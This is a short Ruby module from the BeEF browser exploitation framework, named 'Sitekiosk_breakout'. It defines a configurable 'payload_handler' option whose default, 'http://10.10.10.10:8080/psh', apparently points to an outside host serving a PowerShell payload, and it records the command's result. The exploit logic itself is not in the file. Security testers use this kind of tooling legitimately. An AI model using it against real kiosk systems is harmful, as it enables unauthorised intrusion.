#
# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Sitekiosk_breakout < BeEF::Core::Command

  def pre_send

    # gets the value configured in the module configuration by the user
    @datastore.each do |input|
      if input['name'] == "payload_handler"
        @payload_handler = input['value']
      end
    end

  end

	def self.options
		return [
			{'name' => 'payload_handler', 'ui_label'=>'Payload Handler',  'value' =>'http://10.10.10.10:8080/psh'}
		]
	end

	def post_execute
		save({'result' => @datastore['result']})
	end

end
